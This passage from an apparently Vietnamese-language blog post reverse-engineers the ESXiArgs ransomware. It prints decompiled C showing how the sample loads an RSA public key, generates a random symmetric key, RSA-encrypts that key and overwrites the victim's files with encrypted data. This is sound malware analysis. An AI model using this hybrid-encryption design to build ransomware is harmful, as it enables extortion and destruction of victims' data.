</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lBIO_new_mem_buf</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">0xffffffff</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span>)(<span style="color:#e06c75">lVar1</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Bởi vì đoạn code này cũng khá ngắn và dễ hiểu nên mình sẽ đi qua đoạn code này nhanh. Mình thấy là nó gọi hàm <em>Basic I/O memory buffer</em> (hàm này sẽ tạo 1 cái buffer trong bộ nhớ) để tạo 1 buffer trong bộ nhớ để tạm thời chứa đối tượng RSA, nó sẽ tạo 1 đối tượng RSA từ <code>public_key_buffer</code> và nó gán cái đối tượng vào <code>param_2</code>, mà <code>param_2</code> trong trường hợp này sẽ là <code>local_20</code> ở trong hàm <code>main</code>.</p>
<p>Mình sẽ đặt tên lại cho <code>local_20</code> thành <code>rsa_key_object</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">2</span>],<span style="color:#e06c75">rsa_key_object</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span></code></pre></div><p>Tiếp theo trong hàm <code>main</code> là 1 hàm khá thú vị. Đây là hàm mã hóa. Mình có thể thấy là 1 trong những tham số của hàm này là <code>argv[2]</code>, đây là đường dẫn tới file. Hàm này cũng sẽ có 1 tham số nữa là <code>rsa_key_object</code>.</p>
<p>Mình sẽ phân tích code của hàm này và xem chương trình này mã hóa file như thế nào.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_10</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">long</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">in_FS_OFFSET</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>);
</span></span><span style="display:flex;"><span><span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read_write</span>(<span style="color:#e06c75">file_to_encrypt</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_read&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_74</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mình có thể thấy ở đoạn này thì nó sẽ mở file để đọc và viết. Nó đang đọc file vào biến <code>local_3c</code> thế nên mình sẽ đặt lại tên của biến này là <code>encrypt_file_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">0x20</span>);
</span></span></code></pre></div><p>Ở đoạn này thì nó sẽ gọi hàm <code>get_stream_key()</code>. Mình đoán là hàm này sẽ tạo ra 1 khóa đối xứng. Mình thấy là nó có tham số là <code>0x20</code>, và bất cứ bội số của 16 hay 128 bit sẽ là 1 khóa stream đối xứng. Thế mình nghĩ là khóa đối xứng sẽ được sử dụng mã hóa đối xứng.</p>
<p>Biến <code>local_38</code> là 1 tham số của hàm này, thế nên mình đoán là nó sẽ là buffer cho khóa đối xứng. Mình sẽ đặt lại tên biến này thành <code>sym_key_buffer</code>.</p>
<p>Mình sẽ xem hàm <code>gen_stream_key()</code> có những gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5c07b">bool</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRAND_pseudo_bytes</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">param_2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nhìn tổng thể thì hàm này sẽ tạo ra 1 khóa đối xứng giả ngẫu nhiên. Tức là khóa đối xứng này là an toàn. Nếu như tác giả mã độc này dùng 1 cái seed tạo số random chọn trước hay 1 giá trị không random là khóa thì khóa này sẽ không an toàn và có thể bị phá.</p>
<p>Mình sẽ tiếp tục phân tích ở trong hàm <code>encrypt_file()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_48</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_40</span>);
</span></span></code></pre></div><p>Ở đoạn này thì nó sẽ gọi hàm <code>rsa_encrypt()</code>. Mình sẽ vào phân tích code của hàm này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_2</span>,<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_3</span>,<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">**</span><span style="color:#e06c75">param_4</span>,<span style="color:#e5c07b">int</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pvVar2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">iVar1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pvVar2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>((<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_public_encrypt</span>)(<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;encrypt_bytes: too big data&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nhìn qua thì mình có thể thấy là hàm này đang mã hóa khóa đối xứng sử dụng đối tượng RSA mà nó tạo ra từ trước. Mình có thể thấy là ở dòng <code>iVar1 = (*lRSA_public_encrypt)(param_3,param_2,*param_4,param_1,1);</code> thì <code>param_3</code> là <code>0x20</code> và <code>param_2</code> là <code>sym_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_simple</span>(<span style="color:#e06c75">encrypt_file_buffer</span>,<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#e06c75">param_5</span>);
</span></span></code></pre></div><p>Tiếp theo thì chương trình này sẽ gọi <code>encrypt_simple()</code>. Mình đoán là nó sẽ sử dụng <code>sym_key_buffer</code> để mã hóa <code>encrypt_file_buffer</code>. Nó sẽ lấy khóa đối xứng và dùng nó để mã hóa file.</p>
<p>Nhìn trong hàm <code>encrypt_simple()</code> thì mình thấy là nó là hàm tính toán mã hóa. Thế nên giả định trước của mình là đúng.</p>
<p>Code còn lại sau đoạn này chỉ là xử lý lỗi và viết file đã mã hóa vào file cũ.</p>
<p>Nếu như mình muốn giải mã các file bị mã hóa thì mình cần sử dụng khóa bí mật. Mình sẽ cần lấy khóa đối xứng từ khóa bí mật và dùng khóa đối xứng đó để giải mã các file.</p>
<h1 id="kết-luận">Kết luận</h1>
<p>Đó là quá trình phân tích mã độc ESXiArgs của mình. Mình đã cố gắng đi qua các chi tiết quan trọng trong con mã độc này.</p>
<p>Điều mình thấy lạ về con mã độc này các thông tin debug vẫn còn trong file nhị phân này. Sau khi phân tích mã độc này thì mình thấy là nếu như mình là nạn nhân của con mã độc này thì mình cũng không thể làm gì để lấy lại file. Con mã độc này bắt buộc nạn nhân phải trả tiền bởi vì nó sử dụng mã hóa bất đối xứng cộng với khóa đối xứng random</p>
<p>Kể cả sau khi phân tích con mã độc này, mình cũng không có thông tin gì mà có thể giúp nạn nhân lấy lại file. 1 giả thuyết khá điên của mình là tác giả mã độc để các thông tin debug lại trong file nhị phân để &ldquo;flex&rdquo;, bởi vì họ biết là mã độc của họ, một khi đã mã hóa 1 file thì sẽ phải cần khóa bí mật để giải mã. Và họ là người duy nhất có khóa bí mật đó.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://namberino.github.io/en/tags/m%C3%A3-%C4%91%E1%BB%99c/">mã độc</a></span>
        <span class="tag"><a href="https://namberino.github.io/en/tags/d%E1%BB%8Bch-ng%C6%B0%E1%BB%A3c/">dịch ngược</a></span>
        <span class="tag"><a href="https://namberino.github.io/en/tags/b%E1%BA%A3o-m%E1%BA%ADt/">bảo mật</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>





    </body>
</html>
